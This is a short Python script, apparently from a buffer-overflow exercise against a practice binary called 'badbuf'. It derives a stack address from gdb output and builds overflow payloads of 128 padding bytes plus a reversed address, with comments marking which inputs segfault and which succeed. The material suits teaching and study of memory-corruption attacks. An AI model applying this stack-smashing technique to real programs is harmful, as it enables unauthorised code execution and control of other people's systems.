# Address of the good string
#
# From `disassemble main` inside `gdb badbuf`
#
# with new lines:
# bytes = [0x49,0x66,0x64]
# without new lines:
def hexify(n):
  a = '%x' % n
  bytes = [ a[i:i+2] for i in range(0,len(a),2) ]
  return map(lambda bs: int(bs,16), bytes)
# rbp = 0x7fffffffdb20
rbp = 0x7fffffffdb70
bytes = hexify(rbp - 144)

owns = 'ownz_u!\0' * 16

inputs = [
# junk: NOT the same as 3rd option because here we write null over 0x64
  (owns
   + ''.join(map(chr,reversed(bytes))))

# segfault
, ('a'*128 + ''.join(map(chr,bytes)))

# success! this depends critically on endianness
, ('a'*128 + ''.join(map(chr,reversed(bytes))))

# segfault
, ('a'*128 + 'b'*5 + ''.join(map(chr,reversed(bytes))))

# segfault
, ('a'*128 + 'b'*1 + ''.join(map(chr,reversed(bytes))))

# segfault
, ('a'*128 + ''.join(map(chr,reversed(bytes))) + 'b'*5)

# segfault
, ('a'*128 + ''.join(map(chr,bytes)) + 'b'*5)

# segfault
, ('a'*128 + ''.join(map(chr,bytes)) + 'b'*1) ]

print inputs[0]

# pw
print owns
